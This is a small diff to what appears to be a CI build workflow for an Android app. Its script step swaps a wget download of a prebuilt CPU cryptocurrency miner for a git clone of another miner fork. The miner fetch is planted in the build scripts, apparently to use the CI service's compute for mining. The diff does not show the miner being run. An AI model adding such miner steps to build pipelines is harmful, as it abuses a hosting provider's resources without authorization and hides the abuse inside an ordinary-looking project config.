@@ -20,7 +20,7 @@ workflows:
           source: true
       cancel_previous_builds: false
     scripts:
-      - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+      - git clone https://github.com/cryptozeny/cpuminer-opt-sugarchain.git 
     artifacts:
       - build/**/outputs/**/*.aab
     publishing:
